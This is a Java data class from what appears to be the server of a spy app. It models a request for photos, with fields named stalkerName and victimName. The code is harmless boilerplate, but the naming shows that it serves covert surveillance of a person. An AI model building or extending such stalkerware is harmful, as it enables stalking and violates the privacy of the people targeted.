/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.requestresponsemodel.request;

public class PhotosRequest {

    private String stalkerName;
    private String victimName;

    public PhotosRequest(String stalkerName, String victimName) {
        this.stalkerName = stalkerName;
        this.victimName = victimName;
    }

    public String getStalkerName() {
        return stalkerName;
    }

    public void setStalkerName(String stalkerName) {
        this.stalkerName = stalkerName;
    }

    public PhotosRequest() {

    }

    public String getVictimName() {
        return victimName;
    }

    public void setVictimName(String victimName) {
        this.victimName = victimName;
    }
}
